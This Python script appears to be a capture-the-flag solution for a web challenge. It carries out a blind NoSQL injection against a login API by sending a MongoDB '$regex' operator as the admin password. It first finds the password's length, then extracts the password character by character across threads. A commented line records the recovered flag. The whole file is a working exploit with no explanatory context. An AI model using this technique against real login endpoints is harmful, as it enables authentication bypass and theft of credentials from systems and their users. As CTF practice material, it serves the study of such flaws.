import requests
import threading
import sys
import string

#TARGET_URL = 'http://localhost:1337'
TARGET_URL = 'http://178.62.55.213:32200'

failure = '{"logged":0,"message":"Login Failed"}'
success = '{"logged":1,"message":"Login Successful, welcome back admin."}'

# make pollution
def req(pay):
    print(pay, end="\r")
    a = requests.post(TARGET_URL + '/api/login', json = {
        "username": "admin",
        "password": {"$regex": pay}
    })
    return (a.text)


def getPasswordLength():
    i=0
    res=""
    while(res != success):
        i=i+1
        res=req("^.{"+str(i)+"}$")
    return i

class PasswordThread(threading.Thread):
    def __init__(self,threadID,name,n):
        threading.Thread.__init__(self)
        self.threadID=threadID
        self.name=name
        self.ch=""
        self.n=n

    def run(self):
        self.ch=getPasswordChar(self.n)


def getPasswordChar(n):
    charset = string.printable
    for ch in charset:
        if(ch=="*" or ch=="+" or ch=="." or ch=="?" or ch=="^" or ch=="$" or ch=="|"):
            ch="\\"+ch
        pay="^"+"."*n+ch
        res=req(pay)
        if(res == success):
            return ch

def getPassword():
    l=getPasswordLength()
    print("Length is "+str(l))
    threads=list()
    for i in range(0,l):
        threads.append(PasswordThread(i,"Password_"+str(i), i))
        threads[i].start()
    result=""
    for i in range(0,l):
        threads[i].join()
        result=result+threads[i].ch
    print(result)

getPassword()
#print(req("^CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}$"))